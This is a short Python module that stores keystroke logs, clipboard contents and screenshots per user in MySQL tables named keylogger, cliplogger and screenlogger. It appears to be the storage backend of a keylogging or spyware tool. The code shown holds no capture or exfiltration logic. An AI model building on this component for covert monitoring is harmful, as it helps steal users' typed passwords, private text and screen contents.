from os import getenv
from dotenv import load_dotenv
import pymysql

load_dotenv()

class Database:
    def __init__(self):
        self.connection = self.create_connection()

    def create_connection(self):
        try:
            host = getenv("DB_HOST")
            user = getenv("DB_USER")
            password = getenv("DB_PASS")
            db = getenv("DB_NAME")

            return pymysql.connect(
                host=host,
                user=user,
                password=password,
                db=db,
                autocommit=True
            )
        except Exception as e:
            print("Failed to create database connection:", e)
            return None

    def execute(self, sql, params):
        try:
            with self.connection.cursor() as cursor:
                cursor.execute(sql, params)
        except Exception as e:
            print("Failed to execute SQL:", e)

    def insert_key_log(self, user_id, log, timestamp):
        query = """
            INSERT INTO keylogger (user_id, log, timestamp) 
            VALUES (%s, %s, %s)
        """
        self.execute(query, (user_id, log, timestamp))

    def insert_clip_log(self, user_id, content, timestamp):
        query = "INSERT INTO cliplogger (user_id, log, timestamp) VALUES (%s, %s, %s)"
        self.execute(query, (user_id, content, timestamp))

    def insert_screen_log(self, user_id, screenshot, timestamp):
        query = "INSERT INTO screenlogger (user_id, log, timestamp) VALUES (%s, %s, %s)"
        self.execute(query, (user_id, screenshot, timestamp))
